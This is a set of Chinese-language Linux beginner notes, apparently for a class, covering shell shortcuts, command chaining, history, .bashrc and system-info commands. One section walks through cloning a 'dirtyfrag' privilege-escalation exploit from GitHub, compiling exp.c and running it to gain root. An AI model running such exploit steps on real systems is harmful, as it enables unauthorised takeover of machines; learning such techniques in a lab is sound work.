# Linux 常用指令與操作筆記

這是一份幫你整理好的 Linux 基礎操作與提權漏洞編譯筆記。

---

## 1. 快捷鍵與小技巧 (讓你打字變快的方法)

| 快速鍵 / 動作 | 它能幫你做什麼？ (功能說明) |
| :--- | :--- |
| **`Tab` 鍵** | **自動補齊**：打指令或檔名時，按一下幫你補齊，按兩下幫你列出所有可能。 |
| **`Ctrl` + `A`** | **跳到最前面**：游標直接飛到這一行指令的最開頭。 |
| **`Ctrl` + `E`** | **跳到最後面**：游標直接飛到這一行指令的最結尾。 |

---

## 2. 連續執行多個指令 (符號的秘密)

如果你想一次執行兩個動作（動作 1 和 動作 2）：

* **`動作 1 && 動作 2`**
    * **規則**：動作 1 成功了（沒有報錯），才會接著做動作 2。
    * *比喻*：功課寫完了（成功），才可以去玩電腦（動作 2）。
* **`動作 1 || 動作 2`**
    * **規則**：動作 1 成功了，就**不**做動作 2；如果動作 1 失敗了，**才會**去做動作 2。
    * *比喻*：有買到便當（成功），就不吃泡麵了；沒買到便當（失敗），才去煮泡麵（動作 2）。

---

## 3. 歷史指令快速重複 (不用重新打字)

輸入 `history` 可以看到以前打過的指令和編號：

* **`!數字`**
    * **功能**：直接執行歷史紀錄裡，對應那個編號的指令。
    * *範例*：`!15` 就會直接執行第 15 行的指令。
* **`!文字`**
    * **功能**：直接執行歷史紀錄裡，最近一次用這個文字開頭的指令。
    * *範例*：`!gcc` 就會幫你執行最近一次打過的 `gcc...` 指令。

---

## 4. 環境設定與檔案修改

* **`gedit`**
    * **功能**：Linux 裡面像「記事本」一樣的文字編輯器（會彈出視窗）。
* **`alias`**
    * **功能**：幫長長的指令取「綽號」（簡稱）。
* **修改 `.bashrc` 設定檔**
    * 當你用 `gedit ~/.bashrc` 修改了設定之後，Linux 不會馬上發現。
    * **一定要執行下面其中一個指令**，設定才會生效：
        ```bash
        source ~/.bashrc
        # 或者
        . ~/.bashrc
        ```

---

## 5. 系統資料與容器查詢

* **`uname -r`**：查目前系統的核心（Kernel）版本。
* **`uname -a`**：查完整的系統資訊（包含電腦名稱、核心版本、作業系統等）。
* **`env`**：查看目前所有的「環境變數」（系統裡設定的隱藏變數）。
* **`docker images`** 或 **`images`**：查看電腦裡目前有哪些 Docker 鏡像（鏡像檔案）。
* **`-v`**：通常是指令的參數，代表「顯示詳細過程 (verbose)」或者查「版本 (version)」，在 Docker 裡也代表「掛載資料夾」。

### 查詢系統裡有幾個「普通使用者」：
```bash
cat /etc/passwd | awk -F : '$3 >= 1000 {print $1}' | wc -l
```

### 提權漏洞實戰範例
```bash
cat /etc/passwd | awk -F : '$3 >= 1000 {print $1}' | wc -l

# 1. 從網路上下載 Dirtyfrag 提權漏洞的程式碼
git clone [https://github.com/V4bel/dirtyfrag.git](https://github.com/V4bel/dirtyfrag.git)  

# 2. 走進下載好的資料夾裡面
cd dirtyfrag  

# 3. 安裝 gcc（gcc 是幫我們把程式碼轉成執行檔的工具，需要管理員密碼）
sudo apt install gcc  

# 4. 把 exp.c 這個原始碼檔案，編譯（轉換）成叫做 exp 的可執行檔案
gcc -o exp exp.c  

# 5. 執行編譯好的檔案（通常接下來就是執行 ./exp 來嘗試提權）

```

---


提權  
git clone https://github.com/V4bel/dirtyfrag.git  
cd dirtyfrag  
sudo apt install gcc  
gcc -o exp exp.c  
docker鏡像  
uname -r
uname -a
env
action 1 && action 2 > 1執行成功才會執行2
action 1 || action 2 > 1執行成功，不會執行2；1執行失敗才會執行2
images
cat /etc/passwd | awk -F : '$3 >= 1000 {print $1}'  | wc -l
alias
-v
tab鍵快捷鍵
ctrl A跳到最前面
ctrl E跳到最後面
gedit
修改完.bashrc...要記得source .bashrc或者.  .bashrc
!數字...執行history第n行指令
!命令  執行history中匹配到最新的動作
